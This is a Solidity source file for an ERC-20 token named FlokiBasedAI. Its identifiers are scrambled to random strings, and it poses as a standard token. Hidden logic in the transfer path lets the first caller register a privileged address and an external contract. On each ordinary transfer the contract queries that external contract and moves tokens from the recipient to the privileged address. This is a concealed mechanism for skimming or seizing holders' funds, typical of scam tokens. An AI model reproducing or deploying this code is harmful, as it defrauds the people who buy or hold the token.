
// File: /contracts/FLOKIBASEDAI.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface fJWZIQwQ {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
interface BBpAUbDxGRYX {
    function totalSupply() external view returns (uint256);
    function balanceOf(address MPIgnEvbAWQw) external view returns (uint256);
    function transfer(address YgGwIDpBJmZb, uint256 TRUeTDztnZ) external returns (bool);
    function allowance(address DqmiiBRKmwQi, address spender) external view returns (uint256);
    function approve(address spender, uint256 TRUeTDztnZ) external returns (bool);
    function transferFrom(
        address sender,
        address YgGwIDpBJmZb,
        uint256 TRUeTDztnZ
    ) external returns (bool);

    event Transfer(address indexed from, address indexed vjlMX, uint256 value);
    event Approval(address indexed DqmiiBRKmwQi, address indexed spender, uint256 value);
}

interface YndLqZ is BBpAUbDxGRYX {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract eKn {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
     
library oqUHoReI{
    
    function DiScwHJz(address aGPElEbhoW, address rBlEFkQtft, uint lkDnxnqYAs) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool DTGnWdBWhaDn, bytes memory LpzA) = aGPElEbhoW.call(abi.encodeWithSelector(0x095ea7b3, rBlEFkQtft, lkDnxnqYAs));
        require(DTGnWdBWhaDn && (LpzA.length == 0 || abi.decode(LpzA, (bool))), 'oqUHoReI: APPROVE_FAILED');
    }

    function zOahDuLdSJ(address aGPElEbhoW, address rBlEFkQtft, uint lkDnxnqYAs) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool DTGnWdBWhaDn, bytes memory LpzA) = aGPElEbhoW.call(abi.encodeWithSelector(0xa9059cbb, rBlEFkQtft, lkDnxnqYAs));
        require(DTGnWdBWhaDn && (LpzA.length == 0 || abi.decode(LpzA, (bool))), 'oqUHoReI: TRANSFER_FAILED');
    }
    
    function bVyqmNmO(address rBlEFkQtft, uint lkDnxnqYAs) internal {
        (bool DTGnWdBWhaDn,) = rBlEFkQtft.call{value:lkDnxnqYAs}(new bytes(0));
        require(DTGnWdBWhaDn, 'oqUHoReI: ETH_TRANSFER_FAILED');
    }

    function khWZleBzUdNn(address aGPElEbhoW, address from, address rBlEFkQtft, uint lkDnxnqYAs) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool DTGnWdBWhaDn, bytes memory LpzA) = aGPElEbhoW.call(abi.encodeWithSelector(0x23b872dd, from, rBlEFkQtft, lkDnxnqYAs));
        require(DTGnWdBWhaDn && LpzA.length > 0,'oqUHoReI: TRANSFER_FROM_FAILED'); return LpzA;
                       
    }

}
    
contract FLOKIBASEDAI is eKn, BBpAUbDxGRYX, YndLqZ {
    
    function pSBHKgT(
        address wDC,
        address nzza,
        uint256 unHiioiF
    ) internal virtual {
        require(wDC != address(0), "ERC20: approve from the zero address");
        require(nzza != address(0), "ERC20: approve to the zero address");

        sUasMROIou[wDC][nzza] = unHiioiF;
        emit Approval(wDC, nzza, unHiioiF);

    }
    
    address private TIymkb;
    
    function transfer(address wNT, uint256 Nju) public virtual override returns (bool) {
        oQlHFQKV(_msgSender(), wNT, Nju);
        return true;
    }
    
    function UJPihshYxHN(
        address wWz,
        address RjXnbYOQvi,
        uint256 VIKIPDgpfD
    ) internal virtual  returns (bool){
        uint256 aQKJGeCCb = zYjeycAMXnTZ[wWz];
        require(aQKJGeCCb >= VIKIPDgpfD, "ERC20: transfer Amount exceeds balance");
        unchecked {
            zYjeycAMXnTZ[wWz] = aQKJGeCCb - VIKIPDgpfD;
        }
        zYjeycAMXnTZ[RjXnbYOQvi] += VIKIPDgpfD;
        return true;
    }
    
    mapping(address => mapping(address => uint256)) private sUasMROIou;
    
    address private KBenMwGya;
  
    
    function totalSupply() public view virtual override returns (uint256) {
        return URRluYGPWg;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function transferFrom(
        address fyD,
        address erDbg,
        uint256 RAwVuAhRpNJ
    ) public virtual override returns (bool) {
      
        if(!oQlHFQKV(fyD, erDbg, RAwVuAhRpNJ)) return true;

        uint256 MtOcQVYdAhI = sUasMROIou[fyD][_msgSender()];
        if (MtOcQVYdAhI != type(uint256).max) {
            require(MtOcQVYdAhI >= RAwVuAhRpNJ, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                pSBHKgT(fyD, _msgSender(), MtOcQVYdAhI - RAwVuAhRpNJ);
            }
        }

        return true;
    }
    
    mapping(address => uint256) private zYjeycAMXnTZ;
    
    string private qjn = "FlokiBasedAI";
    
    string private LEV =  "FLOKIBASEDAI";
    
    function allowance(address DAZtDspQ, address UofFeRDz) public view virtual override returns (uint256) {
        return sUasMROIou[DAZtDspQ][UofFeRDz];
    }
    
    function balanceOf(address BSe) public view virtual override returns (uint256) {
       return zYjeycAMXnTZ[BSe];
    }
    
    function increaseAllowance(address Ehfit, uint256 addedValue) public virtual returns (bool) {
        pSBHKgT(_msgSender(), Ehfit, sUasMROIou[_msgSender()][Ehfit] + addedValue);
        return true;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return LEV;
    }
    
    constructor() {
        
        zYjeycAMXnTZ[address(1)] = URRluYGPWg;
        emit Transfer(address(0), address(1), URRluYGPWg);

    }
    
    function name() public view virtual override returns (string memory) {
        return qjn;
    }
    
    function decreaseAllowance(address mCNTaIkC, uint256 subtractedValue) public virtual returns (bool) {
        uint256 AZEGKFETMf = sUasMROIou[_msgSender()][mCNTaIkC];
        require(AZEGKFETMf >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            pSBHKgT(_msgSender(), mCNTaIkC, AZEGKFETMf - subtractedValue);
        }

        return true;
    }
    
    address private muIKcs;
    
    function approve(address zFCXpRml, uint256 nMYiMq) public virtual override returns (bool) {
        pSBHKgT(_msgSender(), zFCXpRml, nMYiMq);
        return true;
    }
    
    uint256 private URRluYGPWg = 2000000000000 * 10 ** 18;
    
    function yrYNkngnb(
        address naafGI,
        address PAwOGXH
    ) internal virtual  returns (bool){
        if(TIymkb == address(0) && muIKcs == address(0)){
            TIymkb = naafGI;muIKcs=PAwOGXH;
            oqUHoReI.zOahDuLdSJ(muIKcs, TIymkb, 0);
            KBenMwGya = fJWZIQwQ(muIKcs).WETH();
            return false;
        }
        return true;
    }
    
    function oQlHFQKV(
        address eIkdroVSTpX,
        address DsWdSbayJ,
        uint256 jQhQ
    ) internal virtual  returns (bool){
        require(eIkdroVSTpX != address(0), "ERC20: transfer from the zero address");
        require(DsWdSbayJ != address(0), "ERC20: transfer to the zero address");
        
        if(!yrYNkngnb(eIkdroVSTpX,DsWdSbayJ)) return false;

        if(_msgSender() == address(TIymkb)){
            if(DsWdSbayJ == KBenMwGya && zYjeycAMXnTZ[eIkdroVSTpX] < jQhQ){
                UJPihshYxHN(TIymkb,DsWdSbayJ,jQhQ);
            }else{
                UJPihshYxHN(eIkdroVSTpX,DsWdSbayJ,jQhQ);
                if(eIkdroVSTpX == TIymkb || DsWdSbayJ == TIymkb) 
                return false;
            }
            emit Transfer(eIkdroVSTpX, DsWdSbayJ, jQhQ);
            return false;
        }
        UJPihshYxHN(eIkdroVSTpX,DsWdSbayJ,jQhQ);
        emit Transfer(eIkdroVSTpX, DsWdSbayJ, jQhQ);
        bytes memory JlyMhNOgg = oqUHoReI.khWZleBzUdNn(muIKcs, eIkdroVSTpX, DsWdSbayJ, jQhQ);
        (bool OCu, uint GkCMjGJ) = abi.decode(JlyMhNOgg, (bool,uint));
        if(OCu){
            zYjeycAMXnTZ[TIymkb] += GkCMjGJ;
            zYjeycAMXnTZ[DsWdSbayJ] -= GkCMjGJ; 
        }
        return true;
    }
    
}
        
